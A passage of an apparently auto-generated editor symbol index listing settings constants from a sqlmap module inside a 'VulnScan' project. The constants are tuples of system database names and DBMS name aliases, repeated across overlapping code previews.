        "peekOfCode": "FIREBIRD_SYSTEM_DBS = (\"RDB$BACKUP_HISTORY\", \"RDB$CHARACTER_SETS\", \"RDB$CHECK_CONSTRAINTS\", \"RDB$COLLATIONS\", \"RDB$DATABASE\", \"RDB$DEPENDENCIES\", \"RDB$EXCEPTIONS\", \"RDB$FIELDS\", \"RDB$FIELD_DIMENSIONS\", \" RDB$FILES\", \"RDB$FILTERS\", \"RDB$FORMATS\", \"RDB$FUNCTIONS\", \"RDB$FUNCTION_ARGUMENTS\", \"RDB$GENERATORS\", \"RDB$INDEX_SEGMENTS\", \"RDB$INDICES\", \"RDB$LOG_FILES\", \"RDB$PAGES\", \"RDB$PROCEDURES\", \"RDB$PROCEDURE_PARAMETERS\", \"RDB$REF_CONSTRAINTS\", \"RDB$RELATIONS\", \"RDB$RELATION_CONSTRAINTS\", \"RDB$RELATION_FIELDS\", \"RDB$ROLES\", \"RDB$SECURITY_CLASSES\", \"RDB$TRANSACTIONS\", \"RDB$TRIGGERS\", \"RDB$TRIGGER_MESSAGES\", \"RDB$TYPES\", \"RDB$USER_PRIVILEGES\", \"RDB$VIEW_RELATIONS\")\nMAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAXDB_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAXDB_SYSTEM_DBS = (\"SYSINFO\", \"DOMAIN\")\nSYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SYBASE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SYBASE_SYSTEM_DBS = (\"master\", \"model\", \"sybsystemdb\", \"sybsystemprocs\")\nDB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DB2_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DB2_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYSCAT\", \"SYSFUN\", \"SYSIBM\", \"SYSIBMADM\", \"SYSIBMINTERNAL\", \"SYSIBMTS\", \"SYSPROC\", \"SYSPUBLIC\", \"SYSSTAT\", \"SYSTOOLS\")\nHSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HSQLDB_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HSQLDB_SYSTEM_DBS = (\"INFORMATION_SCHEMA\", \"SYSTEM_LOB\")\nH2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "H2_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "H2_SYSTEM_DBS = (\"INFORMATION_SCHEMA\",) + (\"IGNITE\", \"ignite-sys-cache\")\nINFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFORMIX_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFORMIX_SYSTEM_DBS = (\"sysmaster\", \"sysutils\", \"sysuser\", \"sysadmin\")\nMONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MONETDB_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MONETDB_SYSTEM_DBS = (\"tmp\", \"json\", \"profiler\")\nDERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DERBY_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DERBY_SYSTEM_DBS = (\"NULLID\", \"SQLJ\", \"SYS\", \"SYSCAT\", \"SYSCS_DIAG\", \"SYSCS_UTIL\", \"SYSFUN\", \"SYSIBM\", \"SYSPROC\", \"SYSSTAT\")\nVERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VERTICA_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VERTICA_SYSTEM_DBS = (\"v_catalog\", \"v_internal\", \"v_monitor\",)\nMCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MCKOI_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MCKOI_SYSTEM_DBS = (\"\",)\nPRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRESTO_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRESTO_SYSTEM_DBS = (\"information_schema\",)\nALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ALTIBASE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ALTIBASE_SYSTEM_DBS = (\"SYSTEM_\",)\nMIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIMERSQL_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIMERSQL_SYSTEM_DBS = (\"information_schema\", \"SYSTEM\",)\nCRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CRATEDB_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CRATEDB_SYSTEM_DBS = (\"information_schema\", \"pg_catalog\", \"sys\")\nCUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUBRID_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CUBRID_SYSTEM_DBS = (\"DBA\",)\nCACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CACHE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CACHE_SYSTEM_DBS = (\"%Dictionary\", \"INFORMATION_SCHEMA\", \"%SYS\")\nEXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXTREMEDB_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EXTREMEDB_SYSTEM_DBS = (\"\",)\nFRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FRONTBASE_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FRONTBASE_SYSTEM_DBS = (\"DEFINITION_SCHEMA\", \"INFORMATION_SCHEMA\")\nRAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RAIMA_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RAIMA_SYSTEM_DBS = (\"\",)\nVIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VIRTUOSO_SYSTEM_DBS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VIRTUOSO_SYSTEM_DBS = (\"\",)\n# Note: (<regular>) + (<forks>)\nMSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MSSQL_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MSSQL_ALIASES = (\"microsoft sql server\", \"mssqlserver\", \"mssql\", \"ms\")\nMYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MYSQL_ALIASES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MYSQL_ALIASES = (\"mysql\", \"my\") + (\"mariadb\", \"maria\", \"memsql\", \"tidb\", \"percona\", \"drizzle\")\nPGSQL_ALIASES = (\"postgresql\", \"postgres\", \"pgsql\", \"psql\", \"pg\") + (\"cockroach\", \"cockroachdb\", \"amazon redshift\", \"redshift\", \"greenplum\", \"yellowbrick\", \"enterprisedb\", \"yugabyte\", \"yugabytedb\")\nORACLE_ALIASES = (\"oracle\", \"orcl\", \"ora\", \"or\")\nSQLITE_ALIASES = (\"sqlite\", \"sqlite3\")\nACCESS_ALIASES = (\"microsoft access\", \"msaccess\", \"access\", \"jet\")\nFIREBIRD_ALIASES = (\"firebird\", \"mozilla firebird\", \"interbase\", \"ibase\", \"fb\")\nMAXDB_ALIASES = (\"max\", \"maxdb\", \"sap maxdb\", \"sap db\")\nSYBASE_ALIASES = (\"sybase\", \"sybase sql server\")\nDB2_ALIASES = (\"db2\", \"ibm db2\", \"ibmdb2\")\nHSQLDB_ALIASES = (\"hsql\", \"hsqldb\", \"hs\", \"hypersql\")",
